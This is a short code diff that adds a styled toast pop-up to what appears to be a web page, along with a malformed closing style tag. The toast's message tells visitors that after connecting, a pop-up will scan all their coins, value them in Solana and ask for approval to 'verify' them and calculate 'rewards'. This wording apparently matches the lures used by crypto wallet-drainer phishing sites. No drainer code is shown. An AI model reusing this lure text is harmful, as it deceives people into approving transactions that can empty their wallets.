@@ -666,9 +666,38 @@
 });
 
 
+<style>
+  #toast {
+  visibility: hidden;
+  min-width: 300px;
+  max-width: 400px;
+  background-color: #1e293b;
+  color: #fff;
+  text-align: center;
+  border-radius: 12px;
+  padding: 16px;
+  position: fixed;
+  z-index: 9999;
+  bottom: 30px;
+  left: 50%;
+  transform: translateX(-50%);
+  font-family: sans-serif;
+  font-size: 15px;
+  box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+  opacity: 0;
+  transition: opacity 0.5s ease, bottom 0.5s ease;
+}
+
+#toast.show {
+  visibility: visible;
+  opacity: 1;
+  bottom: 50px;
+}
+
+<style>
 
 
-
+<div id="toast">After connecting, a pop-up will appear shortly. It will scan all your coins, convert them to Solana value, and ask for approval to verify your coins and calculate your rewards.</div>
 
 
 
